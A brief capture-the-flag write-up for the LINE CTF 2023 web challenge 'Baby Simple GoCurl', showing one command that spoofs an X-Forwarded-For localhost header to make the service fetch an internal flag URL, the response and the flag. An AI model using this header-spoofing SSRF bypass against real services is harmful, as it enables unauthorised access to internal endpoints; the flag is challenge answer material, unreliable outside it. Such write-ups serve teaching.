# LINE CTF 2023 - Web - Baby Simple GoCurl

A typical bypass technique using `X-Forwarded-For`:

```
$ http "http://34.146.230.233:11000/curl/?url=http://127.0.0.1:8080/flag/" X-Forwarded-For:127.0.0.1
HTTP/1.1 200 OK
Content-Length: 90
Content-Type: application/json; charset=utf-8
Date: Mon, 27 Mar 2023 16:08:58 GMT

{
    "body": "{\"message\":\"= LINECTF{6a22ff56112a69f9ba1bfb4e20da5587}\"}",
    "status": "200 OK"
}
```

## Flag

```
LINECTF{6a22ff56112a69f9ba1bfb4e20da5587}
```
